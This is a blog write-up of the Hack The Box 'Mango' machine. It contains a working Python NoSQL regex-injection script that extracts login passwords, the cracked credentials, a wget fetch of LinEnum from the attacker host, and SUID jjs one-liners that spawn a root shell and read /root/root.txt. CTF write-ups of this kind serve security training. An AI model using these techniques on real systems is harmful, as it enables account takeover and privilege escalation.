<!DOCTYPE html>
<html lang="pt">

  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <title>MANGO - Linux Easy Hack The Box writeup | Achute's Log</title>

    <!-- Bootstrap -->
    <link rel="stylesheet" href="/css/bootstrap-3.3.6/css/bootstrap.min.css">
    <link rel="stylesheet" href="/css/main.css">

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
          <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
          <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
        <![endif]-->

    <link rel="alternate" type="application/atom+xml" title="Atom Feed" href="/feed.xml">

</head>


    <body>
      <div class="container">

        <header class="row">
  <div class="col-lg-8 col-lg-offset-2">
	  <h1 class="">achute</h1>
    <p>
    <span class="reserved">char</span> nick[<span class="number">9</span>] = <span class="string">"achute"</span>;
    </p>
    <p>
    printf(<a href="https://github.com/achute" target="_blank"><span class="string">"https://github.com/<span class="reserved">%s\n</span>"</span></a>,nick);
    </p>
    <p>
    printf(<span class="string">"<span class="reserved">%s\x40</span>protonmail<span class="reserved">\x2e\\\b</span>com<span class="reserved">\n</span>"</span>,nick);
    </p>
  </div>
</header>

<div class="row">
  <div class="col-lg-8 col-lg-offset-2">
    <div class="menu">
      <ul>
          <li><a href="/">./HomePage.rb</a></li>
          <li><a href="/hacklog">./hacklog.py</a></li>
          <li><a href="/about">./about.me</a></li>
          |
          <li><a href="/category/">categories</a></li>
          <li><a href="/feed.xml">feed</a></li>
      </ul>
    </div>
  </div>
</div>



	<main>
          <div class="row">
            <div class="col-lg-8 col-lg-offset-2">
              <main>
              <div class="post">

  <header class="post-header">
    <h1>MANGO - Linux Easy Hack The Box writeup</h1>
  </header>

  <article class="post-content">
  <div class="post">

  <header class="post-header">
    <p class="meta">
        Apr 21, 2020
        
        
        â€¢
        <span><a href="/category/#easy_box" class="reserved">easy_box</a>,</span><span><a href="/category/#linux_box" class="reserved">linux_box</a>,</span><span><a href="/category/#htb" class="reserved">htb</a></span>
    </p>
  </header>

  <article class="post-content">
  <h2 id="machine-details">Machine Details:</h2>
<p><strong>IP Address :</strong> 10.10.10.162</p>

<h2 id="flags">Flags:</h2>
<p>User: 79bf31c6</p>

<p>Root: 8a8ef79a</p>

<h2 id="hints">Hints:</h2>
<p>Name of the Machine - might be related to MongoDB.
SSL certificates</p>

<h1 id="take-away">Take Away</h1>
<ul>
  <li>Inspect the HTTPs website - certificates</li>
  <li>Make a habit of registering the hostnames locally.</li>
  <li>Look more into the home folder of the user, likely contains some hint</li>
</ul>

<h1 id="recon">Recon:</h1>
<h2 id="nmap">nmap</h2>
<p>scan command: <code class="highlighter-rouge">nmap -p- </code></p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>scan results
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)      
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))  
443

</code></pre></div></div>

<h2 id="web-page-found">Web Page found:</h2>
<p>Https has some unknown certificate: https://10.10.10.162/</p>

<p>It talks about staging-order.mango.htb, added this as an hostname to /etc/hosts</p>

<p>Voila, there is an webpage (which was previously not present) in the http:// and not https:// webpage.</p>

<p>http://staging-order.mango.htb/</p>

<p>Has a log in screen, might be related to Mongo DB.</p>

<h1 id="foothold-">Foothold :</h1>
<p>For the login web page, Trying to use: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
the python script gives erroneous results.</p>

<p>The python script from https://book.hacktricks.xyz/pentesting-web/nosql-injection Gave proper output :)</p>

<h2 id="script-used">Script Used:</h2>
<p>Notice: I guessed the name admin as the username from the certificate, and mango since the name of the machine is mango. :) - if it fails will enumerate the username as well.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">string</span>

<span class="n">url</span> <span class="o">=</span> <span class="s">"http://staging-order.mango.htb"</span>
<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">"Host"</span><span class="p">:</span> <span class="s">"staging-order.mango.htb"</span><span class="p">}</span>
<span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s">"PHPSESSID"</span><span class="p">:</span> <span class="s">"k90e8p8k65a6b0b1rgbck1tutk"</span><span class="p">}</span>
<span class="n">possible_chars</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span><span class="p">)</span> <span class="o">+</span> <span class="nb">list</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">digits</span><span class="p">)</span> <span class="o">+</span> <span class="p">[</span><span class="s">"</span><span class="si">\</span><span class="se">\</span><span class="s">"</span><span class="o">+</span><span class="n">c</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">punctuation</span><span class="o">+</span><span class="n">string</span><span class="p">.</span><span class="n">whitespace</span> <span class="p">]</span>
<span class="k">def</span> <span class="nf">get_password</span><span class="p">(</span><span class="n">username</span><span class="p">):</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Extracting password of "</span><span class="o">+</span><span class="n">username</span><span class="p">)</span>
    <span class="n">params</span> <span class="o">=</span> <span class="p">{</span><span class="s">"username"</span><span class="p">:</span><span class="n">username</span><span class="p">,</span> <span class="s">"password[$regex]"</span><span class="p">:</span><span class="s">""</span><span class="p">,</span> <span class="s">"login"</span><span class="p">:</span> <span class="s">"login"</span><span class="p">}</span>
    <span class="n">password</span> <span class="o">=</span> <span class="s">"^"</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">possible_chars</span><span class="p">:</span>
            <span class="n">params</span><span class="p">[</span><span class="s">"password[$regex]"</span><span class="p">]</span> <span class="o">=</span> <span class="n">password</span> <span class="o">+</span> <span class="n">c</span> <span class="o">+</span> <span class="s">".*"</span>
            <span class="n">pr</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">params</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
            <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">pr</span><span class="p">.</span><span class="n">status_code</span><span class="p">)</span> <span class="o">==</span> <span class="mi">302</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="s">"pass"</span><span class="p">,</span><span class="n">c</span><span class="p">)</span>
                <span class="n">password</span> <span class="o">+=</span> <span class="n">c</span>
                <span class="k">break</span>
        <span class="k">if</span> <span class="n">c</span> <span class="o">==</span> <span class="n">possible_chars</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]:</span>
            <span class="k">print</span><span class="p">(</span><span class="s">"Found password "</span><span class="o">+</span><span class="n">password</span><span class="p">[</span><span class="mi">1</span><span class="p">:].</span><span class="n">replace</span><span class="p">(</span><span class="s">"</span><span class="si">\</span><span class="se">\</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span><span class="o">+</span><span class="s">" for username "</span><span class="o">+</span><span class="n">username</span><span class="p">)</span>
            <span class="k">return</span> <span class="n">password</span><span class="p">[</span><span class="mi">1</span><span class="p">:].</span><span class="n">replace</span><span class="p">(</span><span class="s">"</span><span class="si">\</span><span class="se">\</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">get_usernames</span><span class="p">():</span>
    <span class="n">usernames</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">params</span> <span class="o">=</span> <span class="p">{</span><span class="s">"username[$regex]"</span><span class="p">:</span><span class="s">""</span><span class="p">,</span> <span class="s">"password[$regex]"</span><span class="p">:</span><span class="s">".*"</span><span class="p">,</span> <span class="s">"login"</span><span class="p">:</span> <span class="s">"login"</span><span class="p">}</span>
    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">possible_chars</span><span class="p">:</span>
        <span class="n">username</span> <span class="o">=</span> <span class="s">"^"</span> <span class="o">+</span> <span class="n">c</span>
        <span class="n">params</span><span class="p">[</span><span class="s">"username[$regex]"</span><span class="p">]</span> <span class="o">=</span> <span class="n">username</span> <span class="o">+</span> <span class="s">".*"</span>
        <span class="n">pr</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">params</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
        <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">pr</span><span class="p">.</span><span class="n">status_code</span><span class="p">)</span> <span class="o">==</span> <span class="mi">302</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="s">"Found username starting with "</span><span class="o">+</span><span class="n">c</span><span class="p">)</span>
            <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
                <span class="k">for</span> <span class="n">c2</span> <span class="ow">in</span> <span class="n">possible_chars</span><span class="p">:</span>
                    <span class="n">params</span><span class="p">[</span><span class="s">"username[$regex]"</span><span class="p">]</span> <span class="o">=</span> <span class="n">username</span> <span class="o">+</span> <span class="n">c2</span> <span class="o">+</span> <span class="s">".*"</span>
                    <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">params</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="bp">False</span><span class="p">).</span><span class="n">status_code</span><span class="p">)</span> <span class="o">==</span> <span class="mi">302</span><span class="p">:</span>
                        <span class="n">username</span> <span class="o">+=</span> <span class="n">c2</span>
                        <span class="k">print</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
                        <span class="k">break</span>

                <span class="k">if</span> <span class="n">c2</span> <span class="o">==</span> <span class="n">possible_chars</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]:</span>
                    <span class="k">print</span><span class="p">(</span><span class="s">"Found username: "</span><span class="o">+</span><span class="n">username</span><span class="p">[</span><span class="mi">1</span><span class="p">:])</span>
                    <span class="n">usernames</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">username</span><span class="p">[</span><span class="mi">1</span><span class="p">:])</span>
                    <span class="k">break</span>
    <span class="k">return</span> <span class="n">usernames</span>

<span class="n">usernames</span> <span class="o">=</span> <span class="p">[</span><span class="s">"admin"</span><span class="p">,</span><span class="s">"mango"</span><span class="p">]</span>
<span class="k">for</span> <span class="n">u</span> <span class="ow">in</span> <span class="n">usernames</span><span class="p">:</span>
    <span class="n">get_password</span><span class="p">(</span><span class="n">u</span><span class="p">)</span>

</code></pre></div></div>

<p>Was able to find the passwords:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>admin : t9KcS3&gt;!0B#2
mango : h3mXK8RhU~f{]f5H
</code></pre></div></div>

<p>Screen-Shot of the script output.</p>

<p><img src="../../_resources/75f312370d134f34bd6500062a08d5f5.png" alt="f4bc96690381ae8e708dfd9567e1a274.png" /></p>

<p>Logging into the website gave:</p>

<p><img src="../../_resources/e593df41839d40feb9c2276e464bc6ef.png" alt="38e6dd193b053e4ddcbe00572afa2b08.png" /></p>

<h1 id="user">User:</h1>

<p>SSH into the box with the previous passwords:
admin - fails
mango - works :)</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>su admin
cat /home/admin/user.txt
79bf31c6c6
</code></pre></div></div>

<h1 id="priv-esc">Priv Esc:</h1>

<p>su admin
password is the one found above.</p>

<h1 id="root">Root:</h1>

<p>Checked a bunch of stuffs did not help corntab looks to be running. Might come back to this latter.</p>

<p>Will try to run the LinuxEnum Script.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Attacker Machine:
cd /root/HTB/LOCAL/LinEnum
python -m SimpleHTTPServer 8080

Target Machine:
wget http://10.10.15.72:8080/LinEnum.sh
</code></pre></div></div>
<p>Interesting Findings:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>

[+] Possibly interesting SGID files:
-rwsr-sr-- 1 root admin 10352 Jul 18  2019 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs

[+] Possibly interesting SUID files:                                              
-rwsr-sr-- 1 root admin 10352 Jul 18  2019 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs      
</code></pre></div></div>

<p>Lets try:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p &lt;$(tty) &gt;$(tty) 2&gt;$(tty)').waitFor()" | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs

This Freezes but we see #

echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc ls /root/').waitFor()" | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs

Did not work :(

sh -c 'cp $(which jjs) .; chmod +s ./jjs'
echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh id').waitFor()" | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs

echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p cat /root/root.txt').waitFor()" | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs

Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh id').waitFor()
Java.type('java.lang.Runtime').getRuntime().exec('ls -la /root/').waitFor()
</code></pre></div></div>

<p>looked more into the home folder of the user.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ls -la /home/admin
found a file for jjs history; found this code snippet..

var BufferedReader = Java.type("java.io.BufferedReader");
var FileReader = Java.type("java.io.FileReader");
var br = new BufferedReader(new FileReader("/root/root.txt"));
while ((line = br.readLine()) != null) { print(line); }

</code></pre></div></div>

<p>Works :)
Owned the Root.</p>

  </article>

	<p class="feed-recomendation">
		Subscribe?  <a href="/feed.xml">feed</a>
	</p>


</div>

  </article>

</div>

              </main>
            </div>
          </div>
	</main>

        <div class="row">
  <div class="col-lg-8 col-lg-offset-2">
    <footer>
      > follow me on <a href="https://twitter.com/achute">twitter</a> <
    </footer>
  </div>
</div>


      </div>
    </body>
</html>
